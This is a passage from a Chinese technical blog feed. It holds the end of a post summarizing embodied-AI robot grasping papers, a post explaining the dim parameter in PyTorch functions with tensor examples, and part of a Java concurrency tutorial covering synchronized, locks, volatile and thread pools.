/></p><p>训练：</p><ul><li>输入包括手腕摄像头图像、头部摄像头图像、机器人本体感知状态（如关节角度）以及目标物体的 Mask；</li><li>DINOv2 提取图像特征 + 机器人本体感知（7 个手臂关节角度 + 6 个手关节角度），输出的动作也是 13 元组；</li><li>最小化预测动作与真实动作之间的差异来训练模型（binary reward，数学模型可以看懂）；</li></ul><p>结果：</p><ul><li><strong>泛化能力</strong>强：DexGraspVLA 在数千种未见过的物体、光照和背景组合下的抓取成功率超过 90%，展示了其在“零样本”（Zero-Shot）环境中的强大泛化能力。</li><li>与不使用视觉编码器的基线相比，DexGraspVLA 在单物体抓取任务中的成功率显著更高，证明了其在领域不变特征上进行模仿学习的有效性；</li><li>Planner 在复杂环境下的目标物体边界框预测准确率超过 99%，展示了其在视觉定位任务中的可靠性。</li></ul><p>不足和展望：</p><ul><li>First, due to the time limit, our training dataset does not encompass very small objects or extremely cluttered environments; performance on these more challenging cases could improve with dedicated data collection.（训练数据集中未包含非常小的物体或极度杂乱的环境）；</li><li>Additionally, we have not yet explored functional grasping for subsequent object usage, which is a promising direction for future work.（未来的工作可以探索功能性抓取 (Functional Grasping) 以及更复杂的环境设置）；</li></ul><h2 id="News-amp-Papers"><a href="#News-amp-Papers" class="headerlink" title="News &amp; Papers"></a>News &amp; Papers</h2><ul><li>灵初智能Psi R0.5：两小时数据解锁全面泛化，具身智能再突破！<ul><li>(2025.3.3) 新闻：<a href="https://www.msn.cn/zh-cn/news/other/%E7%81%B5%E5%88%9D%E6%99%BA%E8%83%BDpsi-r0-5-%E4%B8%A4%E5%B0%8F%E6%97%B6%E6%95%B0%E6%8D%AE%E8%A7%A3%E9%94%81%E5%85%A8%E9%9D%A2%E6%B3%9B%E5%8C%96-%E5%85%B7%E8%BA%AB%E6%99%BA%E8%83%BD%E5%86%8D%E7%AA%81%E7%A0%B4/ar-AA1A8aMg?ocid=BingNewsSerp">MSN</a></li><li>Project &amp; Paper: <a href="https://github.com/Psi-Robot/DexGraspVLA">https://github.com/Psi-Robot/DexGraspVLA</a></li></ul></li><li>机器人安灯泡、切东西都能拿捏，可操控轨迹跟踪的DexTrack来了！<ul><li>(2025.3.2) 新闻：<a href="https://www.jiqizhixin.com/articles/2025-03-02-5">机器之心</a></li><li>[ICLR’25] Project &amp; Paper:  <a href="https://github.com/Meowuu7/DexTrack">https://github.com/Meowuu7/DexTrack</a></li></ul></li><li>“我”在 UIUC 学起立？当代博士生不想自己动手扶机器人，竟然训练了….<ul><li>(2025.2.18) 新闻：<a href="https://www.bilibili.com/video/BV1pJA8epExA">bilibili</a></li><li>Project &amp; Paper:  <a href="https://humanoid-getup.github.io/">https://humanoid-getup.github.io/</a></li></ul></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;HumanUP-Learning-Getting-Up-Policies-for-Real-World-Humanoid-Robots&quot;&gt;&lt;a href=&quot;#HumanUP-Learning-Getting-Up-Policies-for-Real-World-H</summary>
      
    
    
    
    <category term="technical" scheme="https://blog.sjtuxhw.top/categories/technical/"/>
    
    
    <category term="AI" scheme="https://blog.sjtuxhw.top/tags/AI/"/>
    
    <category term="EmbodiedAI" scheme="https://blog.sjtuxhw.top/tags/EmbodiedAI/"/>
    
    <category term="IL" scheme="https://blog.sjtuxhw.top/tags/IL/"/>
    
  </entry>
  
  <entry>
    <title>如何理解 PyTorch 函数的 dim 参数</title>
    <link href="https://blog.sjtuxhw.top/technical/pytorch-dim/"/>
    <id>https://blog.sjtuxhw.top/technical/pytorch-dim/</id>
    <published>2025-02-18T12:17:05.000Z</published>
    <updated>2025-02-28T12:42:57.462Z</updated>
    
    <content type="html"><![CDATA[<p>之前很长的一段时间内，我都不太清楚如何感性地理解 PyTorch 中的 <code>dim</code> 参数。最近琢磨到了一个还算比较好理解的方法，故简单记录在这里。</p><p><code>dim</code> 在 PyTorch 的很多函数中都可以指定，例如 <code>sum / mode / unsqueeze / topk</code> 等等，主要是告诉函数应该针对张量的哪个特定维度操作。</p><p>这在输入张量维度很高的时候就不那么直观了。虽说不理解问题不大，最多手写循环就能达到目的。但如果我们想尽量避免使用 python 的显式循环，或者还想要利用广播机制来更快的完成计算任务，就不得不总结一下了。</p><ul><li><p><strong><u>聚合类函数</u></strong>（<strong><u>减小维度数的运算</u></strong>，reduction operations），例如 <code>sum / mean / max / min / mode / topk</code> 等等；</p><ul><li><p><code>dim</code> 通常的语义是 “沿这个维度进行消除”，如果有指定 <code>keepdim=True</code>，则这个维度 size 压缩为 1；</p></li><li><p><code>dim</code> 的值就对应张量 shape 的索引；</p></li><li><p>被操作的每个元素的 shape 就是 原张量的 shape 在 <code>dim</code> 索引之后组成的新的 shape，即 <code>shape[dim+1:]</code>；</p></li></ul><blockquote><p>例如对于 <code>a = torch.tensor([ [ [[1],[2],[3]], [[2],[3],[4]] ], [ [[3],[4],[5]], [[4],[5],[6]] ] ])</code>，它的 shape 是 <code>(2, 2, 3, 1)</code>；</p><p>tips. <strong><u>对于高维张量的形状，请从外向里读，这样更清楚一点</u></strong>；</p><p>那么 <code>sum(a, dim=2)</code> 的含义就是沿着 size 为 3 的维度（shape 索引是 2）相加，被求和的元素的 shape 就是原 shape 中索引为 2 向后的组成的。不难发现 size 为 3 的维度的元素是 shape 是 <code>(1,)</code> 的子元素，把子元素加起来就行，答案应该是 <code>[ [ [[6]], [[9]] ], [ [[12]], [[15]] ] ]</code>；</p><p>再来个简单的：<code>b = torch.tensor([[1,2,3], [4,5,6]])</code>，这个 <code>(2,3)</code> 的张量是不是就非常清楚了？我们计算 <code>sum(b, dim=0)</code> 就是对 size 为 2 的维度求和，也就是元素是 shape <code>(3,)</code> 的张量求和，答案显然是 <code>[[5,7,9]]</code>；</p></blockquote></li><li><p><strong><u>拼接类函数</u></strong>（<strong><u>不改变维度数的运算</u></strong>），例如 <code>cat</code> 等，<code>dim</code> 通常的语义是 “拼接的方向”；</p><ul><li>“拼接的方向” 是指，拼接后 size 有变化的维度；例如 <code>a = torch.zeros(2, 3); b = torch.zeros(2, 4)</code>，<code>torch.cat([a,b], dim=1)</code> 就是让行对齐、列增大的拼接方式；</li><li>拼接得到的张量的 shape 和原张量的 shape 的维度数相同，只是某个维度上的 size 有所不同；</li></ul></li><li><p><strong><u>扩展类函数</u></strong>（<strong><u>增加维度数的运算</u></strong>，expansion operations），例如 <code>unsqueeze / stack</code> 等，<code>dim</code> 通常的语义是在原张量的指定维度下添加 size 为 N ($N\ge1$) 的维度；</p><ul><li><p>对于 <code>unsqueeze</code>，没有向张量引入其他信息，只是在原张量 shape 索引为 <code>dim</code> 的位置插入 1 来扩展；</p></li><li><p>比较难以理解的是 <code>stack</code>，很多人会把 <code>stack</code> 和 <code>cat</code> 的作用搞混。但我们只需要搞清楚本质上 <code>stack</code> 是维度扩展类函数，而 <code>cat</code> 则是拼接类函数，就行了！<code>cat</code> 不改变张量的维度，只是将两个或以上张量在已有维度上拼接；而 <code>stack</code> 则是通过新增一个维度来连接两个张量。</p><p>像 <code>a = torch.zeros(2,3); b = torch.ones(2,3)</code>，如果执行 <code>torch.stack([a,b], dim=2)</code>，则是在原张量 shape 为 <code>(2,3)</code> 的情况下构造一个 shape 为 <code>(2,3,2)</code> 的新张量（在 shape 索引为 <code>dim=2</code> 的位置插入一个 size=2 的维度，分别装 <code>a</code> 和 <code>b</code>）。至于最终如何表示输出的张量，很简单，就是在第三个维度把两个张量排在一起，这么表示：<code>[[[0, 1], [0, 1], [0, 1]], [[0, 1], [0, 1], [0, 1]]]</code>，还好只有 3 维，我们可以感性地画出来：</p><p><img src="imgs/pth_stack.jpg" width="450px" /></p></li></ul></li></ul><p>综上，在维度很高、没法感性理解的时候，可以尝试列出输入的 shape（从外向内读），然后在你要执行的函数中指定 <code>dim</code>，按规则写出输出的 shape，你就能清楚这个操作究竟在做什么了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;之前很长的一段时间内，我都不太清楚如何感性地理解 PyTorch 中的 &lt;code&gt;dim&lt;/code&gt; 参数。最近琢磨到了一个还算比较好理解的方法，故简单记录在这里。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;dim&lt;/code&gt; 在 PyTorch 的很多函数中都可以指定，例如 &lt;co</summary>
      
    
    
    
    <category term="technical" scheme="https://blog.sjtuxhw.top/categories/technical/"/>
    
    
    <category term="AI" scheme="https://blog.sjtuxhw.top/tags/AI/"/>
    
    <category term="ML" scheme="https://blog.sjtuxhw.top/tags/ML/"/>
    
    <category term="PyTorch" scheme="https://blog.sjtuxhw.top/tags/PyTorch/"/>
    
  </entry>
  
  <entry>
    <title>Java 进阶（三）：垃圾回收、并发、JDNI &amp; SPI</title>
    <link href="https://blog.sjtuxhw.top/technical/java-adv-3/"/>
    <id>https://blog.sjtuxhw.top/technical/java-adv-3/</id>
    <published>2025-01-06T05:44:06.000Z</published>
    <updated>2025-01-18T15:03:54.801Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Chapter-7-Java-Concurrent"><a href="#Chapter-7-Java-Concurrent" class="headerlink" title="Chapter 7. Java Concurrent"></a>Chapter 7. Java Concurrent</h1><h2 id="7-1-Usage"><a href="#7-1-Usage" class="headerlink" title="7.1 Usage"></a>7.1 Usage</h2><p>读者回忆一下在计算机系统课程中学习的关于 thread 和 process 的知识，最好能够在心中对比一下在 C/C++ 中使用线程和进程。</p><p>我们本节的目的是在 Java 中使用线程。两种方法：</p><ul><li>使用 <code>Runnable</code> Interface：<ol><li>重写 <code>public void run()</code> 方法；</li><li>将这个类的实例作为 <code>Thread</code>  类型的构造参数。构造完成后启动 <code>Thread#start()</code> 即可；</li></ol></li><li>继承于 <code>Thread</code> Class；<ol><li>重写 <code>public void run()</code> 方法；</li><li>直接启动：<code>Thread#start()</code>；</li></ol></li></ul><p>注意，我们需要特别处理 <code>InterruptedException</code>：</p><ul><li><p>Java 多线程程序中，我们应该总是考虑这种 exception。这意味着外部有人正在希望以一种优雅的方式结束当前线程（就是对当前线程对象 <code>Thread#interrupt()</code>），并且可能正在通过 <code>Thread#join()</code> 等待；</p></li><li><p>不应该在捕获这个异常的时候直接抛出另外一种异常（混淆原因），或者直接忽略（外部线程可能正在等待结束！）；</p></li><li><p>根据方法自身的含义，一般有两种解决方案：</p><ol><li>继续向上传播这个异常（当你的方法本身就是一个耗时操作 / 网络操作或者其他情况）；</li><li>捕获这个异常、设置当前线程被 interrupted 的 flag（方便 log 溯源）：<code>Thread.currentThread.interrupt()</code>，并且准备结束；</li></ol><p>然后处理当前类中需要回收 / 处理的资源。无论是哪一种方法，都需要遵循当前方法的语义：“调用它出现 <code>InterruptException</code> 这种情况是否合理？”</p></li></ul><h2 id="7-2-Synchronized-Methods"><a href="#7-2-Synchronized-Methods" class="headerlink" title="7.2 Synchronized Methods"></a>7.2 Synchronized Methods</h2><p>Java 线程中的设定和 C/C++ 是类似的，它也会共享线程间的资源，不过 Java 没有指针，只是通过引用共享的。因此会遇到和 C/C++ 一样的问题。</p><p>就以共享静态变量为例，多线程同时操作共享静态变量会导致未定义的行为（race condition）。</p><p>在 C/C++ 中，一般会通过设立临界区（信号量 semaphore）或互斥锁（mutex）来锁定共享变量，确保同一时间只有一个/指定数量的线程可以访问。</p><p>在 Java 中，提供了一种修饰方法的关键字 <code>synchronized</code>，其作用是：</p><ol><li><p>被该关键字修饰的方法，其所在的类型的任意一个对象，只能被一个线程调用被这个关键字修饰的方法。</p><p>也就是说，相当于在这个方法的类上设一个互斥锁（被称为 intrinsic lock 固有锁，或者 monitor lock），把这个类中所有被 <code>synchroized</code> 修饰的方法锁住；</p></li><li><p>当一个线程退出了一个对象的 synchronized 方法，则会与这个对象其他的 synchronized 方法建立一个 happens-before relationship，以确保对象被使用的状态能被所有线程知道；</p></li></ol><p>如果 <code>synchronized</code> 修饰在静态方法上，那么锁住的就是与 intrinsic lock 关联的 class 实例，而不是它的实例的实例。也就是对这个类中静态域的访问会被控制，需要与实例方法的 <code>synchronized</code> 区分开。</p><p>Java 甚至支持到 statement 细粒度的 <code>synchronized</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">    <span class="comment">// 这里保护实例属性的并发访问（this）</span></span><br><span class="line">    <span class="comment">// 如果需要保护静态成员，则需要将关键字定义在静态方法上</span></span><br><span class="line">    <span class="comment">// 或者括号内使用 Class 元类型的实例</span></span><br><span class="line">    <span class="keyword">synchronized</span>(<span class="built_in">this</span>) &#123;</span><br><span class="line">        lastName = name;</span><br><span class="line">        nameCount++; </span><br><span class="line">    &#125; </span><br><span class="line">    nameList.add(name); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="7-3-Reentrant-Synchronization"><a href="#7-3-Reentrant-Synchronization" class="headerlink" title="7.3 Reentrant Synchronization"></a>7.3 Reentrant Synchronization</h2><p>Java 中提供了一类可重入锁，可以让获得锁的同一个线程多次访问临界资源：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 注意，如果需要保护类的静态成员，则应该将锁也定义为静态成员</span></span><br><span class="line"><span class="type">Lock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantLock</span>();</span><br><span class="line"></span><br><span class="line">lock.lock();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">//更新对象状态</span></span><br><span class="line">    <span class="comment">//捕获异常，并在必须时恢复不变性条件</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">   e.printStackTrace();</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">   lock.unlock();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="7-4-Atomic-Access-amp-Keyword-volatile"><a href="#7-4-Atomic-Access-amp-Keyword-volatile" class="headerlink" title="7.4 Atomic Access &amp; Keyword volatile"></a>7.4 Atomic Access &amp; Keyword <code>volatile</code></h2><p>Java 中原生的单步原子访问操作包含：</p><ul><li><p>针对引用变量的读写、大多数基本类型的读 <strong><u>或</u></strong> 写（除了 <code>long</code> / <code>double</code>）；</p></li><li><p>被 <code>volatile</code> 关键字修饰的所有变量的读 <strong><u>或</u></strong> 写（包括 <code>long</code> 和 <code>double</code>）；</p><blockquote><p><code>volatile</code> 的本质是，程序在访问一个被它修饰的变量后，会<strong><u>直接进入 main memory 读取，而不会使用寄存器 / 线程本地缓存</u></strong>；相当于告诉 JVM 这个变量可能会在当前线程的控制流以外的地方被更改。</p><p>它会确保当一个线程修改了一个变量时，其他线程能够立即看到这个修改。</p><p>底层是通过<u>禁止指令重排序和 memory barrier（如 x86-64 的 <code>fence</code> 族指令）</u> 等机制来实现的。</p></blockquote></li></ul><p>Java 的原子访问操作可以：</p><ul><li>保证多线程操作一个数据时值不会错误的改变（写操作字节码指令会一次性执行完），降低 memory inconsistency 的风险；</li><li>保证各个线程总是能读到关于这个值最新情况（读操作字节码指令会读到最新的情况并且一次性执行完）；</li></ul><p>那么，<strong><u>为什么 Java 既然有内置 <code>Atomic</code> Classes、锁、synchronous 关键字等等同步机制，为什么还需要 volatile 关键字</u></strong>？</p><p>问出这个问题就说明你将 “多线程原子操作”（也称 “同步”）和这里的 “单步原子访问操作” 的概念混淆了。</p><ul><li>单步原子操作是指，Java 中的一条基本字节码指令（例如读一次内存、写一次内存）会不会被 CPU（其他线程）从中间打断、打乱；</li><li>多线程原子操作通常讨论的是一条/一系列 Java 代码的执行（例如从获取内存中的共享变量值到自增写回的这个流程）会不会被 CPU（其他线程）从中间打断；</li></ul><p>我们发现，满足单步原子访问操作是满足多线程原子操作的<u>必要不充分条件</u>。因此底层在实现多线程同步机制时，一定已经实现了单步原子访问的操作（及时刷到内存中）。</p><p>单步的原子操作是<strong><u>由语言本身以及硬件指令的特征决定</u></strong>。在 Java 中，为了保证灵活性还向上提供了 <code>volatile</code> 关键字，相当于告诉 JVM 和 CPU，被它修饰的变量一是不能放在寄存器中/缓存下来，二是它需要满足单步原子操作（不能乱序执行）。</p><p><img src="imgs/volatile.png" width="350px" /></p><p>而多线程原子操作则需要开发者按照程序语义，利用同步机制手动指定代码片段的临界区，即同一时刻的访问控制。</p><p>总结一下，你只需要记住这些：</p><ul><li><code>volatile</code> 保证 Java 多线程对某个变量的读、写是及时的（不使用寄存器、不使用线程缓存、禁止指令乱序），一定能被下一条指令 / 其他线程感知到；</li><li>其他的同步操作，保证 Java 代码片段执行期间的临界特性（不会有另一个线程同时执行相同代码）；</li><li>为共享变量加锁（或者其他同步机制）之后，就不再需要 <code>volatile</code> 关键字了（后者是前者的必要不充分条件）；</li></ul><p>因此，只有在<u>没有多线程同步的需求</u>（<code>volatile</code> 不保证同一线程对变量的一系列操作是原子的），但是又要保证对某一个变量的读和写是准确、及时的时候，可以使用 <code>volatile</code> 关键字，例如状态标志、简单的布尔变量等，这样不需要加锁，规避了死锁以及性能问题。</p><blockquote><p>注意：C/C++ 中的 <code>volatile</code> 关键字的含义与 Java 有些差异。</p><p>它只是告诉 Compiler 不要优化被修饰的变量，并且把它放在内存中，每次读写都直接对内存操作。常用在嵌入式 / 绕过编译器进行内存映射等场景中。</p><p>这里没有单步原子操作的说法，因为 C/C++ 编译结束后直接就是机器码。</p></blockquote><h2 id="7-5-Dead-Lock-Starvation-Live-Lock"><a href="#7-5-Dead-Lock-Starvation-Live-Lock" class="headerlink" title="7.5 Dead Lock, Starvation, Live Lock"></a>7.5 Dead Lock, Starvation, Live Lock</h2><p>无论是死锁还是活锁，都是指多个线程之间因互相请求访问资源而导致程序无法继续执行的情况。</p><p>它们的不同点是：</p><p>对于死锁，它发生的情况是多个线程或进程在互相等待对方释放资源时，自己又不会主动释放自己占有的资源，导致程序永远无法继续的情况。</p><blockquote><p>例如，假设一个程序的两个线程 A 和 B，A 先获得了一个资源 X 并给它上锁，B 获得了另一个资源 Y 也给它上了锁。但是接下来 B 需要资源 X 才能继续、A 又需要 Y 才能继续。所以二者相互等待对方释放资源锁，造成了死锁；</p></blockquote><p>对于活锁，线程并不会阻塞在原地，而是反复地在释放资源和获取资源间横跳，这主要是因为程序有处理资源访问冲突的机制，但是两个存在活锁的线程相互处理访问冲突的时候又造成了访问冲突，也无法继续下去。</p><blockquote><p>例如一个程序的线程 A 和 B，假设 A 先获得了一个资源 X 并给它上锁，B 获得了另一个资源 Y 也给它上了锁。A 想要获取资源 Y 的时候发现 B 占用了，于是 A 主动释放了资源 X 给 B，自己去获取资源 Y；但是此时 B 也主动释放了 Y 资源，去获取 X 资源，双方只是调换了资源持有的顺序，仍然无法继续执行。</p></blockquote><p>线程饥饿是指，因为共享资源调度策略的问题，造成某些线程一直无法获得执行的机会而近乎停止执行，而另一些线程则一直占用共享资源不释放。</p><h2 id="7-6-Condition-Variable-in-Java-Guarded-Blocks"><a href="#7-6-Condition-Variable-in-Java-Guarded-Blocks" class="headerlink" title="7.6 Condition Variable in Java: Guarded Blocks"></a>7.6 Condition Variable in Java: Guarded Blocks</h2><p>在 Java 中，和 C/C++ 的 condition variable 对应的、在 blocks 前通过某些方式检查（例如轮询）一些条件再决定执行的，线程动作同步的术语被称为 guarded block。</p><p>Java 中被 <code>synchrounous</code> 修饰的方法可用 <code>Object#wait()</code> 和 <code>Object#notify*() / notifyAll()</code> 来实现与 condition variable 相似的效果。</p><ul><li><code>Object#wait()</code>：此时会设置等待的信息、放锁并且挂起当前线程（不是 spin lock）；</li><li><code>Object#notify / notifyAll()</code>：另一个线程可以通过访问当前对象的这两个方法来唤醒等待在 intrinsic lock 上的线程，把锁交给它们；</li></ul><p>我们可以利用 guarded blocks 模仿 condition variable 的做法实现生产者消费者模式。</p><h2 id="7-7-Immutable-Objects"><a href="#7-7-Immutable-Objects" class="headerlink" title="7.7 Immutable Objects"></a>7.7 Immutable Objects</h2><p>在很多实际情况下，不可变数据类型的好处：</p><ul><li><p>复制构造时，不是引用传递，因此是深拷贝。这样使用起来和基本类型一样方便，但是又不用担心改错源数据（非引用链接）；</p></li><li><p>确保数据在多线程情况下无需同步，线程安全！</p></li></ul><p>我们在 Java Bean &amp; Record 一节已经讨论过。不可变类的定义：一个类满足如下三个条件：</p><ul><li>类型中的每个数据域都是 <u>私有的、常量的</u>（<code>private</code>，<code>final</code>）；</li><li>每个数据域都只能通过 <code>getter</code> 方法获取，不能有任何 <code>setter</code> 方法，并且没有“返回值是指向可变数据域的引用”的 <code>getter</code> 方法；</li><li>必须存在公有构造函数，并且构造函数内初始化各个数据域（常量只能这么做）；</li><li>Object 基类继承函数 <code>equals</code> 返回 <code>true</code> 当且仅当类中的每个数据域都相等；</li><li>Object 基类继承函数 <code>hashCode</code> 在类中的每个数据域都相等时，一定返回一样的值；</li><li>Object 基类继承函数 <code>toString</code> 最好包含 类名 和 每个数据域的名称和值； </li></ul><p><strong>因此如果有一个类数据域都私有、没有修改器方法，但有一个方法：返回内部一个可变数据域的引用（例如数组），则这个类也是可变类</strong>；</p><h2 id="7-8-High-Level-Concurrency-Objects"><a href="#7-8-High-Level-Concurrency-Objects" class="headerlink" title="7.8 High Level Concurrency Objects"></a>7.8 High Level Concurrency Objects</h2><p>Java 中包装了一些高级并发对象：</p><h3 id="7-8-1-Lock-Objects"><a href="#7-8-1-Lock-Objects" class="headerlink" title="7.8.1 Lock Objects"></a>7.8.1 Lock Objects</h3><p>Lock Objects：对常见的并发场景提供了简单的保护；</p><blockquote><p>例如 <code>ReentrantLock</code>（可重入锁），</p><p>可以使用 <code>tryLock()</code> 获取锁、<code>unlock()</code> 释放锁。</p><p>和 Intrinsic Lock 机制很相似（包括持有规则、通过关联的 Condition 对象 notify/wait）相比更好的一点是 “允许 try”，也就是获取锁不成功的话还可以回到获取锁前的执行状态。</p></blockquote><h3 id="7-8-2-Executors"><a href="#7-8-2-Executors" class="headerlink" title="7.8.2 Executors"></a>7.8.2 Executors</h3><blockquote><p>创建一个新的线程可以通过继承 Thread 类或者实现 Runnable 接口来实现，这两种方式创建的线程在运行结束后会被虚拟机销毁，进行垃圾回收，如果线程数量过多，频繁的创建和销毁线程会浪费资源，降低效率。而线程池的引入就很好解决了上述问题，线程池可以更好的创建、维护、管理线程的生命周期，做到复用，提高资源的使用效率，也避免了开发人员滥用 new 关键字创建线程的不规范行为。</p><p>在实际生产中，一般企业内部会规定编码规范。例如 Aliyun 指出，线程资源必须通过线程池提供，不允许在应用中显式的创建线程。如果不使用线程池，有可能造成系统创建大量同类线程而导致消耗完内存或者“过度切换”的问题。</p></blockquote><p>Executors：为启动、管理线程提供了更高级的 API，可以使用线程池机制为大规模并发应用提供支持；</p><p>将线程创建、管理的工作从应用业务逻辑中剥离。Java 中的 Executor 就是来包装这个的接口。</p><p>其中，有一些框架 / 库可以实现 Executor 接口。例如：</p><ul><li>Thread Pools：线程池，最常见的对于 Executor 的 implementation；</li><li>Fork/Join：一个利用多处理器资源的 Executor 实现框架。</li></ul><p><code>Executor</code> 接口只有一个：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">execute</span><span class="params">(java.lang.Runnable runnable)</span>;</span><br></pre></td></tr></table></figure><p>不需要自行创建 <code>Thread</code>，而是将 Runnable 类放到 Executor 中，让它帮你启动和管理。</p><p>类似地，还有 <code>ExecutorService</code> 接口，提供了比 <code>Executor</code> 更灵活的线程提交方式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ExecutorService</span> <span class="keyword">extends</span> <span class="title class_">java</span>.util.concurrent.Executor, java.lang.AutoCloseable;</span><br></pre></td></tr></table></figure><p>类似 <code>Executor</code>，不过它不仅仅允许你提交 <code>Runnable</code> 对象，还允许使用 <code>Callable</code>，并使用 <code>Future&lt;T&gt;</code> 来异步获取返回值，可以通过返回的 <code>Future</code> 对象了解、管理 Runnable/Callable 的执行状态：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Future&lt;?&gt; submit(Runnable runnable);</span><br><span class="line">Future&lt;T&gt; <span class="title function_">submit</span><span class="params">(Runnable runnable, T t)</span>;</span><br><span class="line">Future&lt;T&gt; <span class="title function_">submit</span><span class="params">(Callable&lt;T&gt; callable)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 同时启动多个 callable 对象</span></span><br><span class="line">List&lt;Future&lt;T&gt;&gt; <span class="title function_">invokeAll</span><span class="params">(Collection&lt;? extends Callable&lt;T&gt;&gt; collection)</span> <span class="keyword">throws</span> InterruptedException;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 等待终止</span></span><br><span class="line"><span class="type">boolean</span> <span class="title function_">awaitTermination</span><span class="params">(<span class="type">long</span> l, TimeUnit timeUnit)</span> <span class="keyword">throws</span> InterruptedException;</span><br></pre></td></tr></table></figure><p>在 <code>ExecutorService</code> 基础上继续包装 <code>ScheduledExecutorService</code>，允许对线程启动提供调度 delay 的时间：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ScheduledFuture&lt;V&gt; <span class="title function_">schedule</span><span class="params">(Callable&lt;V&gt; callable, <span class="type">long</span> l, TimeUnit timeUnit)</span>;</span><br><span class="line">ScheduledFuture&lt;?&gt; schedule(Runnable runnable, <span class="type">long</span> l, TimeUnit timeUnit);</span><br></pre></td></tr></table></figure><h4 id="A-Implementation-ThreadPoolExecutor"><a href="#A-Implementation-ThreadPoolExecutor" class="headerlink" title="A. Implementation: ThreadPoolExecutor"></a>A. Implementation: <code>ThreadPoolExecutor</code></h4><p>Thread Pool 线程池，是 <code>Executor</code> 的一种实现，用的最多的是 <code>ThreadPoolExecutor</code> 类型。</p><ul><li><p><code>ThreadPoolExecutor</code> 类型继承：</p><p><img src="imgs/concurrent-executor-hier.png" width="350px" /></p></li><li><p><code>ThreadPoolExecutor</code> 状态维护：运行状态 (<code>runState</code>) 和线程数量 (<code>workerCount</code>) 放在同一个 Atomic Integer 中，高 3 位保存 <code>runState</code>，低 29 位保存 <code>workerCount</code>，二者同时取出避免数据不一致或者频繁占用锁资源。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="type">AtomicInteger</span> <span class="variable">ctl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AtomicInteger</span>(ctlOf(RUNNING, <span class="number">0</span>));</span><br></pre></td></tr></table></figure></li><li><p><code>runState</code>：共有 5 种：</p><p>| 运行状态   | 状态描述                                                     |<br>| ————— | —————————————————————————————— |<br>| RUNNING    | 运行状态。能接收新提交的任务，也能处理阻塞队列中的任务       |<br>| SHUTDOWN   | 准备关闭状态。不接受新提交的任务，但能处理阻塞队列中的任务   |<br>| STOP       | 停止状态。所有正在执行的任务会被终止，不接受新提交任务、队列中存在的任务 |<br>| TIDYING    | 空闲状态。所有任务都已经结束，并且当前有效线程数（<code>workerCount</code>）为 0 |<br>| TERMINATED | 终止状态。在空闲状态下才能终止，标识不再使用                 |</p><p><img src="imgs/concurrent-tpe-runstate.png" width="550px" /></p></li><li><p><code>execute</code> Control Flow：</p><ol><li>首先检测线程池运行状态，如果不是 <code>RUNNING</code>，则直接拒绝；</li><li>如果 <code>workerCount &lt; corePoolSize</code>，则创建并启动一个线程来执行新提交的任务；</li><li>如果 <code>workerCount &gt;= corePoolSize</code>，且线程池内的阻塞队列未满，则将任务添加到该阻塞队列中；</li><li>如果 <code>workerCount &gt;= corePoolSize &amp;&amp; workerCount &lt; maximumPoolSize</code>，且线程池内的阻塞队列已满，则创建并启动一个线程来执行新提交的任务；</li><li>如果 <code>workerCount &gt;= maximumPoolSize</code>，并且线程池内的阻塞队列已满，则根据拒绝策略来处理该任务，默认的处理方式是直接抛异常。</li></ol></li><li><p>拒绝策略（饱和策略）：</p><ul><li><strong><code>AbortPolicy</code></strong>：默认策略，抛出异常 <code>RejectedExecutionException</code>，拒绝执行；</li><li><strong><code>CallerRunsPolicy</code></strong>：调用执行自己的线程运行任务，也就是直接在调用 <code>execute</code> 方法的线程中运行 (run) 被拒绝的任务，如果执行程序已关闭，则会丢弃该任务。因此这种策略会降低对于新任务提交速度，影响程序的整体性能。如果您的应用程序可以承受此延迟并且要求任何一个任务请求都要被执行的话，你可以选择这个策略；</li><li><strong><code>DiscardPolicy</code></strong>：不处理新任务，直接丢弃掉；</li><li><strong><code>DiscardOldestPolicy</code></strong>：此策略将丢弃最早的未处理的任务请求。</li></ul></li></ul><p>使用 <code>ThreadPoolExecutor</code> 一般配合 fixed thread pool 的策略。好处是可以让应用 degraded gracefully。</p><p>不过 <code>Executor</code> 